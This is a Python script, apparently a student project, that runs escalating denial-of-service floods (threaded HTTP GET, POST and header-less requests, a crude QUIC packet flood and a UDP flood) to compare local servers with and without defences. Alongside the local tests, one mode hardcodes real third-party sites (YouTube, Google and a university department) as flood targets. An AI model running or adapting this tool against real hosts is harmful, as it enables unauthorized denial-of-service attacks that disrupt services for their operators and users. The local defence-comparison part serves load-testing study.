"""
漸進式攻擊測試 - 自動增加線程直到伺服器卡頓
測試不同防禦機制的效果
支援 HTTP/1.1, HTTP/2, HTTP/3(QUIC) 協議測試
每個請求獨立計數,使用不同 source port
"""
import requests
import threading
import time
import sys
import socket
import struct
from collections import defaultdict
from urllib.parse import urlparse

# HTTP/3 支援
try:
    from aioquic.asyncio import connect
    from aioquic.quic.configuration import QuicConfiguration
    import asyncio
    QUIC_AVAILABLE = True
except ImportError:
    QUIC_AVAILABLE = False
    print("⚠️  警告: 未安裝 aioquic,無法測試 HTTP/3。安裝方式: pip install aioquic")

def get_local_ip():
    """獲取本機局域網IP"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

class ProgressiveAttack:
    def __init__(self, target_url, attack_method='GET', protocol='HTTP/1.1'):
        self.target_url = target_url
        self.attack_method = attack_method
        self.protocol = protocol  # HTTP/1.1, HTTP/2, HTTP/3
        self.success_count = 0
        self.error_count = 0
        self.lock = threading.Lock()
        self.running = True
        self.response_times = []
        self.request_count = 0  # 實際請求計數（不依賴連線數）
        self.udp_packet_count = 0  # UDP 封包計數（for QUIC）
        self.unique_ports_used = set()  # 記錄使用的 source port
        
    def reset_stats(self):
        with self.lock:
            self.success_count = 0
            self.error_count = 0
            self.response_times = []
            self.request_count = 0
            self.udp_packet_count = 0
            self.unique_ports_used.clear()
    
    def http_get_attack(self):
        """標準 GET 請求 - 每個請求獨立連線,不重用 TCP"""
        while self.running:
            session = None
            try:
                # 每個請求創建新 session,避免連線重用
                session = requests.Session()
                
                # 禁用連線池和 keep-alive
                session.headers['Connection'] = 'close'
                
                # 綁定到隨機 source port
                source_port = self._get_random_port()
                
                # 創建帶 source port 的 socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.bind(('', source_port))  # 綁定隨機 port
                
                # 使用自訂 socket 發送請求
                adapter = requests.adapters.HTTPAdapter()
                session.mount('http://', adapter)
                session.mount('https://', adapter)
                
                start = time.time()
                response = session.get(self.target_url, timeout=5)
                elapsed = time.time() - start
                
                with self.lock:
                    self.success_count += 1
                    self.request_count += 1  # 請求計數
                    self.response_times.append(elapsed)
                    self.unique_ports_used.add(source_port)
                    
                sock.close()
            except Exception as e:
                with self.lock:
                    self.error_count += 1
                    self.request_count += 1
            finally:
                if session:
                    session.close()
    
    def http_post_attack(self):
        """POST 請求帶數據 - 每個請求獨立連線"""
        while self.running:
            session = None
            try:
                session = requests.Session()
                session.headers['Connection'] = 'close'
                
                source_port = self._get_random_port()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.bind(('', source_port))
                
                start = time.time()
                data = {'data': 'x' * 1000}
                response = session.post(self.target_url, data=data, timeout=5)
                elapsed = time.time() - start
                
                with self.lock:
                    self.success_count += 1
                    self.request_count += 1
                    self.response_times.append(elapsed)
                    self.unique_ports_used.add(source_port)
                    
                sock.close()
            except Exception as e:
                with self.lock:
                    self.error_count += 1
                    self.request_count += 1
            finally:
                if session:
                    session.close()
    
    def http_no_headers_attack(self):
        """無 User-Agent 的請求 (測試請求驗證) - 每個請求獨立連線"""
        while self.running:
            session = None
            try:
                session = requests.Session()
                session.headers['Connection'] = 'close'
                session.headers['User-Agent'] = ''
                
                source_port = self._get_random_port()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.bind(('', source_port))
                
                start = time.time()
                response = session.get(self.target_url, timeout=5)
                elapsed = time.time() - start
                
                with self.lock:
                    self.success_count += 1
                    self.request_count += 1
                    self.response_times.append(elapsed)
                    self.unique_ports_used.add(source_port)
                    
                sock.close()
            except Exception as e:
                with self.lock:
                    self.error_count += 1
                    self.request_count += 1
            finally:
                if session:
                    session.close()
    
    def _get_random_port(self):
        """獲取隨機可用的 source port (避免衝突)"""
        # 使用臨時範圍 49152-65535
        import random
        return random.randint(49152, 65535)
    
    def http3_attack(self):
        """HTTP/3 (QUIC) 攻擊 - 使用 UDP"""
        if not QUIC_AVAILABLE:
            print("⚠️  HTTP/3 不可用,請安裝 aioquic")
            return
            
        while self.running:
            try:
                # 解析 URL
                parsed = urlparse(self.target_url)
                host = parsed.hostname
                port = parsed.port or 443
                
                # 創建 UDP socket 並綁定隨機 source port
                source_port = self._get_random_port()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.bind(('', source_port))
                
                start = time.time()
                
                # 發送簡單的 QUIC 握手封包
                # 這是簡化版本,實際 QUIC 更複雜
                quic_packet = self._create_quic_packet()
                sock.sendto(quic_packet, (host, port))
                
                sock.settimeout(5)
                try:
                    response, addr = sock.recvfrom(4096)
                    elapsed = time.time() - start
                    
                    with self.lock:
                        self.success_count += 1
                        self.request_count += 1
                        self.udp_packet_count += 1
                        self.response_times.append(elapsed)
                        self.unique_ports_used.add(source_port)
                except socket.timeout:
                    with self.lock:
                        self.error_count += 1
                        self.request_count += 1
                        self.udp_packet_count += 1
                
                sock.close()
            except Exception as e:
                with self.lock:
                    self.error_count += 1
                    self.request_count += 1
    
    def _create_quic_packet(self):
        """創建簡單的 QUIC Initial 封包"""
        # QUIC 封包結構 (簡化版)
        # 這只是模擬,真實的 QUIC 封包需要完整的加密和協議處理
        flags = 0xC0  # Long header, Initial packet
        version = 0x00000001  # QUIC v1
        
        # 構建基本封包
        packet = struct.pack('!BI', flags, version)
        packet += b'\x00' * 20  # 目標連線 ID
        packet += b'\x00' * 100  # Payload (簡化)
        
        return packet
    
    def udp_flood_attack(self):
        """UDP 洪水攻擊 - 純 UDP 流量測試"""
        while self.running:
            try:
                parsed = urlparse(self.target_url)
                host = parsed.hostname
                port = parsed.port or 80
                
                # 隨機 source port
                source_port = self._get_random_port()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.bind(('', source_port))
                
                start = time.time()
                
                # 發送 UDP 封包
                payload = b'X' * 1024  # 1KB 數據
                sock.sendto(payload, (host, port))
                
                elapsed = time.time() - start
                
                with self.lock:
                    self.success_count += 1
                    self.request_count += 1
                    self.udp_packet_count += 1
                    self.response_times.append(elapsed)
                    self.unique_ports_used.add(source_port)
                
                sock.close()
            except Exception as e:
                with self.lock:
                    self.error_count += 1
                    self.request_count += 1
    
    def get_attack_function(self):
        """根據攻擊方法返回對應函數"""
        methods = {
            'GET': self.http_get_attack,
            'POST': self.http_post_attack,
            'NO_HEADERS': self.http_no_headers_attack,
            'HTTP3': self.http3_attack,
            'UDP': self.udp_flood_attack
        }
        return methods.get(self.attack_method, self.http_get_attack)
    
    def test_with_threads(self, num_threads, duration=10):
        """使用指定線程數測試"""
        self.running = True
        self.reset_stats()
        
        attack_func = self.get_attack_function()
        
        # 啟動線程
        threads = []
        for _ in range(num_threads):
            t = threading.Thread(target=attack_func)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # 等待測試完成
        time.sleep(duration)
        self.running = False
        time.sleep(1)
        
        # 計算統計數據
        with self.lock:
            total_requests = self.request_count  # 使用實際請求計數
            success_rate = (self.success_count / total_requests * 100) if total_requests > 0 else 0
            avg_response = sum(self.response_times) / len(self.response_times) if self.response_times else 0
            request_rate = self.request_count / duration  # 基於實際請求數
            unique_ports = len(self.unique_ports_used)
        
        return {
            'threads': num_threads,
            'success': self.success_count,
            'failed': self.error_count,
            'success_rate': success_rate,
            'avg_response_time': avg_response,
            'request_rate': request_rate,
            'total_requests': total_requests,  # 實際請求數
            'udp_packets': self.udp_packet_count,  # UDP 封包數
            'unique_ports': unique_ports  # 使用的不同 port 數量
        }

def print_result(result, is_severe=False):
    """打印測試結果"""
    threads = result['threads']
    success = result['success']
    failed = result['failed']
    success_rate = result['success_rate']
    avg_time = result['avg_response_time']
    rate = result['request_rate']
    total_req = result.get('total_requests', success + failed)
    udp_pkts = result.get('udp_packets', 0)
    unique_ports = result.get('unique_ports', 0)
    
    # 判定狀態 - 區分防禦攔截和性能卡頓
    # 如果延遲很低但成功率低,表示是防禦系統攔截,不是性能問題
    if avg_time > 2.0:  # 延遲超過 2 秒才算真正卡頓
        status = "🔴 嚴重卡頓"
        severe = True
    elif avg_time > 1.0:  # 延遲超過 1 秒
        status = "🟠 明顯延遲"
        severe = False
    elif avg_time > 0.5:  # 延遲超過 500ms
        status = "🟡 輕微影響"
        severe = False
    elif success_rate < 30:  # 延遲低但成功率極低 = 防禦攔截
        status = "🛡️  防禦攔截"
        severe = False
    elif success_rate < 50:  # 延遲低但成功率偏低
        status = "🟡 部分攔截"
        severe = False
    else:
        status = "🟢 運作正常"
        severe = False
    
    # 顯示詳細統計
    udp_info = f" | UDP: {udp_pkts}" if udp_pkts > 0 else ""
    port_info = f" | Ports: {unique_ports}"
    
    print(f"  線程: {threads:3d} | 請求: {total_req:4d} | 成功: {success:4d} | 失敗: {failed:4d} | "
          f"成功率: {success_rate:5.1f}% | 延遲: {avg_time*1000:6.1f}ms | "
          f"速率: {rate:6.1f} req/s{udp_info}{port_info} | {status}")
    
    return severe

def progressive_test(target_url, attack_method, defense_enabled, protocol='HTTP/1.1'):
    """漸進式測試 - 逐步增加線程"""
    print(f"\n{'='*120}")
    defense_text = "🛡️  有防禦" if defense_enabled else "❌ 無防禦"
    print(f"測試目標: {target_url} | 防禦: {defense_text} | 方法: {attack_method} | 協議: {protocol}")
    print(f"每個請求使用獨立連線和不同 source port,避免被 HTTP/2/QUIC 合併")
    print(f"{'='*120}")
    print(f"  {'線程':<6} {'請求數':>7} {'成功':>6} {'失敗':>6} {'成功率':>8} {'延遲':>10} {'速率':>12} {'UDP':>6} {'Ports':>7} {'狀態'}")
    print(f"{'='*120}")
    
    attacker = ProgressiveAttack(target_url, attack_method, protocol)
    
    # 漸進式增加線程
    thread_steps = [10, 100, 500, 800]
    results = []
    
    for num_threads in thread_steps:
        result = attacker.test_with_threads(num_threads, duration=8)
        results.append(result)
        is_severe = print_result(result)
        
        # 只有真正的性能卡頓才停止測試(延遲 > 10秒)
        # 如果只是防禦攔截,繼續測試
        if is_severe and result['avg_response_time'] > 10.0:
            print(f"\n⚠️  伺服器效能嚴重下降,停止增加線程")
            break
        
        time.sleep(2)  # 每次測試間隔
    
    print(f"{'='*120}\n")
    return results

def full_comprehensive_test():
    """完整綜合測試 - 測試所有方法對 YouTube, Google 和本地伺服器"""
    import datetime
    import random
    import os
    
    # 確保 report 目錄存在
    report_dir = "../report"
    if not os.path.exists(report_dir):
        os.makedirs(report_dir)
    
    output_file = f"{report_dir}/ddos_test_report_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    
    # 獲取本機IP
    local_ip = get_local_ip()
    
    # 所有目標伺服器
    targets = [
        ("https://www.youtube.com", "YouTube"),
        ("https://www.google.com", "Google"),
        ("https://www.csie.nuk.edu.tw", "高大資工系"),
        (f"http://{local_ip}:8000", "本地無防禦伺服器"),
        (f"http://{local_ip}:8001", "本地有防禦伺服器")
    ]
    
    # 隨機打亂伺服器順序
    random.shuffle(targets)
    
    methods = [
        ('GET', 'HTTP/1.1'),
        ('POST', 'HTTP/1.1'),
        ('NO_HEADERS', 'HTTP/1.1'),
        ('UDP', 'UDP')
    ]
    
    thread_steps = [10, 100, 500, 800]
    
    print("""
    ╔══════════════════════════════════════════════════════════════════════════════╗
    ║                     完整綜合 DDoS 測試 (伺服器隨機順序)                    ║
    ║                                                                              ║
    ║  目標: YouTube, Google, 高科大, 本地伺服器×2                               ║
    ║  方法: GET, POST, NO_HEADERS, UDP                                           ║
    ║  線程: 10, 800, 100, 500, 1000, 1200                                        ║
    ║  輸出: TXT 報告檔案                                                         ║
    ║  執行: 自動執行所有測試,無需按 Enter                                       ║
    ╚══════════════════════════════════════════════════════════════════════════════╝
    """)
    
    total_tests = len(targets) * len(methods) * len(thread_steps)
    print(f"📊 伺服器數量: {len(targets)} (隨機順序)")
    print(f"📊 每個伺服器測試: {len(methods)} 種方法 × {len(thread_steps)} 種線程 = {len(methods) * len(thread_steps)} 個測試")
    print(f"📊 總測試數量: {total_tests}")
    print(f"📝 報告將儲存至: {output_file}")
    print(f"⏱️  預估時間: 約 {total_tests * 10 // 60} 分鐘\n")
    
    print("🔀 伺服器測試順序:")
    for i, (url, name) in enumerate(targets, 1):
        print(f"   {i}. {name}")
    print()
    
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write("="*120 + "\n")
        f.write("DDoS 攻擊測試完整報告 (伺服器隨機順序)\n")
        f.write(f"測試時間: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"伺服器數量: {len(targets)}\n")
        f.write(f"測試總數: {total_tests}\n")
        f.write(f"線程配置: {thread_steps}\n")
        f.write("="*120 + "\n\n")
        
        f.write("伺服器測試順序:\n")
        for i, (url, name) in enumerate(targets, 1):
            f.write(f"  {i}. {name} ({url})\n")
        f.write("\n" + "="*120 + "\n\n")
        
        test_counter = 0
        
        # 按伺服器順序測試
        for server_idx, (url, name) in enumerate(targets, 1):
            print(f"\n{'='*120}")
            print(f"🎯 伺服器 [{server_idx}/{len(targets)}]: {name}")
            print(f"{'='*120}\n")
            
            f.write("\n" + "="*120 + "\n")
            f.write(f"伺服器 {server_idx}/{len(targets)}: {name} ({url})\n")
            f.write("="*120 + "\n\n")
            
            # 對每個伺服器執行所有方法和線程組合
            for method, protocol in methods:
                print(f"\n📡 方法: {method} ({protocol})")
                print(f"{'='*100}")
                
                f.write(f"\n方法: {method} ({protocol})\n")
                f.write("-"*120 + "\n")
                
                attacker = ProgressiveAttack(url, method, protocol)
                
                for num_threads in thread_steps:
                    test_counter += 1
                    print(f"  線程: {num_threads:4d} | 進度: [{test_counter}/{total_tests}] ", end='', flush=True)
                    
                    try:
                        result = attacker.test_with_threads(num_threads, duration=8)
                        
                        # 組合結果行
                        line = (f"成功: {result['success']:4d} | "
                               f"失敗: {result['failed']:4d} | "
                               f"成功率: {result['success_rate']:5.1f}% | "
                               f"延遲: {result['avg_response_time']*1000:6.1f}ms | "
                               f"速率: {result['request_rate']:6.1f} req/s | "
                               f"Ports: {result['unique_ports']:3d}")
                        
                        if result.get('udp_packets', 0) > 0:
                            line += f" | UDP: {result['udp_packets']}"
                        
                        print(f"| {line}")
                        
                        f.write(f"  線程: {num_threads:4d} | {line}\n")
                        
                        # 重置統計
                        attacker.reset_stats()
                        
                    except Exception as e:
                        error_msg = f"❌ 失敗: {str(e)}"
                        print(f"| {error_msg}")
                        f.write(f"  線程: {num_threads:4d} | {error_msg}\n")
                    
                    time.sleep(1)
                
                print()
            
            print(f"\n✅ {name} 測試完成\n")
            f.write(f"\n{name} 測試完成\n")
            f.write("="*120 + "\n\n")
        
        f.write("\n" + "="*120 + "\n")
        f.write("所有測試完成\n")
        f.write("="*120 + "\n")
    
    print(f"\n{'='*120}")
    print(f"✅ 所有測試完成! 報告已儲存至: {output_file}")
    print(f"{'='*120}\n")
    return output_file

def compare_defense_effectiveness():
    """比較有無防禦的效果"""
    print("""
    ╔══════════════════════════════════════════════════════════════════════════════╗
    ║           DDoS 防禦效果對比測試 - 漸進式攻擊分析                           ║
    ║                                                                              ║
    ║  測試方式: 逐步增加攻擊線程,直到伺服器嚴重卡頓                             ║
    ║  比較指標: 響應時間、成功率、最大承受能力                                   ║
    ║  增強功能: 每請求獨立計數、QUIC/UDP支援、不同source port                    ║
    ╚══════════════════════════════════════════════════════════════════════════════╝
    """)
    
    # 獲取本機IP
    local_ip = get_local_ip()
    
    print(f"📍 攻擊來源IP: {local_ip}")
    print(f"🎯 伺服器配置:")
    print(f"   - 無防禦伺服器: http://{local_ip}:8000")
    print(f"   - 有防禦伺服器: http://{local_ip}:8001")
    print(f"\n💡 三者使用不同配置:")
    print(f"   - 攻擊來源: {local_ip} (你的電腦)")
    print(f"   - 伺服器監聽: 0.0.0.0 (所有接口)")
    print(f"   - 端口分離: 8000 (無防禦) vs 8001 (有防禦)")
    
    print("\n📋 測試計畫:")
    print("  1. 測試無防禦伺服器 (端口 8000)")
    print("  2. 測試有防禦伺服器 (端口 8001)")
    print("  3. 測試不同攻擊方法 (GET/POST/HTTP3/UDP)")
    print("  4. 每個請求使用不同 source port")
    print("  5. 支援 UDP/QUIC 流量統計")
    
    choice = input("\n選擇測試模式:\n  [1] 完整對比測試 (需要同時啟動2個伺服器)\n  [2] 僅測試單一伺服器\n  [3] 完整綜合測試 (YouTube & Google 所有方法)\n請選擇: ")
    
    if choice == '3':
        full_comprehensive_test()
        return
    
    if choice == '1':
        print("\n" + "="*100)
        print("⚠️  請確保已啟動兩個伺服器:")
        print(f"  終端1: python server.py              → 端口 8000 (無防禦)")
        print(f"  終端2: python server_defense.py      → 端口 8001 (有防禦)")
        print("="*100)
        
        input("\n按 Enter 開始測試無防禦伺服器 (8000)...")
        
        # 測試1: 無防禦伺服器
        no_defense_url = f"http://{local_ip}:8000"
        print("\n" + "🎯 " * 30)
        print(f"第一階段: 測試無防禦伺服器 ({no_defense_url})")
        print("🎯 " * 30)
        no_defense_results = progressive_test(no_defense_url, "GET", False, 'HTTP/1.1')
        
        input("\n按 Enter 繼續測試有防禦伺服器 (8001)...")
        
        # 測試2: 有防禦伺服器 - GET
        defense_url = f"http://{local_ip}:8001"
        print("\n" + "🛡️ " * 30)
        print(f"第二階段: 測試有防禦伺服器 ({defense_url})")
        print("🛡️ " * 30)
        defense_get_results = progressive_test(defense_url, "GET", True, 'HTTP/1.1')
        
        # 測試3: 有防禦伺服器 - POST
        print("\n" + "🛡️ " * 30)
        print("第三階段: 測試有防禦伺服器 (POST 攻擊)")
        print("🛡️ " * 30)
        defense_post_results = progressive_test(defense_url, "POST", True, 'HTTP/1.1')
        
        # 測試4: 有防禦伺服器 - 無 Headers
        print("\n" + "🛡️ " * 30)
        print("第四階段: 測試有防禦伺服器 (無 User-Agent 攻擊)")
        print("🛡️ " * 30)
        defense_noheader_results = progressive_test(defense_url, "NO_HEADERS", True, 'HTTP/1.1')
        
        # 總結對比
        print_comparison_summary(no_defense_results, defense_get_results, defense_post_results, defense_noheader_results)
        
    else:
        # 單一伺服器測試
        print("\n選擇要測試的伺服器:")
        print("  [1] 無防禦伺服器 (端口 8000)")
        print("  [2] 有防禦伺服器 (端口 8001)")
        print("  [3] 自定義URL")
        
        server_choice = input("請選擇: ")
        
        if server_choice == '1':
            url = f"http://{local_ip}:8000"
            has_defense = False
        elif server_choice == '2':
            url = f"http://{local_ip}:8001"
            has_defense = True
        else:
            url = input("輸入伺服器 URL: ")
            has_defense = input("是否有防禦? (y/n): ").lower() == 'y'
        
        print("\n選擇攻擊方法:")
        print("  [1] GET 請求 (HTTP/1.1)")
        print("  [2] POST 請求 (HTTP/1.1)")
        print("  [3] 無 User-Agent (HTTP/1.1)")
        print("  [4] HTTP/3 (QUIC over UDP)" + ("" if QUIC_AVAILABLE else " ⚠️  需要安裝 aioquic"))
        print("  [5] UDP 洪水攻擊")
        method_choice = input("請選擇 (1/2/3/4/5): ")
        
        method_map = {
            '1': ('GET', 'HTTP/1.1'),
            '2': ('POST', 'HTTP/1.1'),
            '3': ('NO_HEADERS', 'HTTP/1.1'),
            '4': ('HTTP3', 'HTTP/3'),
            '5': ('UDP', 'UDP')
        }
        attack_method, protocol = method_map.get(method_choice, ('GET', 'HTTP/1.1'))
        
        results = progressive_test(url, attack_method, has_defense, protocol)

def print_comparison_summary(no_defense, defense_get, defense_post, defense_noheader):
    """打印總結對比"""
    print("\n" + "="*100)
    print("📊 測試總結與對比分析")
    print("="*100)
    
    # 找出最大承受能力
    def max_stable_threads(results):
        for r in results:
            if r['success_rate'] < 80 or r['avg_response_time'] > 1.0:
                return r['threads']
        return results[-1]['threads'] if results else 0
    
    no_def_max = max_stable_threads(no_defense)
    def_get_max = max_stable_threads(defense_get)
    def_post_max = max_stable_threads(defense_post)
    def_noheader_max = max_stable_threads(defense_noheader)
    
    print(f"\n🎯 最大穩定承受線程數:")
    print(f"  ❌ 無防禦 (GET):          {no_def_max:3d} 線程")
    print(f"  🛡️  有防禦 (GET):          {def_get_max:3d} 線程  (提升 {((def_get_max/no_def_max-1)*100 if no_def_max>0 else 0):.0f}%)")
    print(f"  🛡️  有防禦 (POST):         {def_post_max:3d} 線程  (提升 {((def_post_max/no_def_max-1)*100 if no_def_max>0 else 0):.0f}%)")
    print(f"  🛡️  有防禦 (無 Headers):   {def_noheader_max:3d} 線程  (提升 {((def_noheader_max/no_def_max-1)*100 if no_def_max>0 else 0):.0f}%)")
    
    print(f"\n💡 關鍵發現:")
    print(f"  1. 防禦系統可提升 {((def_get_max/no_def_max-1)*100 if no_def_max>0 else 0):.0f}% 的抗壓能力")
    print(f"  2. 速率限制有效阻擋大量並發請求")
    print(f"  3. 請求驗證可過濾無效攻擊 (無 User-Agent)")
    print(f"  4. 自適應延遲在高負載時保護伺服器")
    print(f"  5. IP 黑名單機制防止持續攻擊")
    
    print("\n🛡️  防禦建議:")
    print("  ✅ 啟用速率限制 - 最有效的防禦")
    print("  ✅ 實施 IP 黑名單 - 阻擋惡意來源")
    print("  ✅ 請求驗證 - 過濾機器人攻擊")
    print("  ✅ 連接數限制 - 防止資源耗盡")
    print("  ✅ 自適應延遲 - 動態調整負載")
    
    print("="*100 + "\n")

if __name__ == '__main__':
    compare_defense_effectiveness()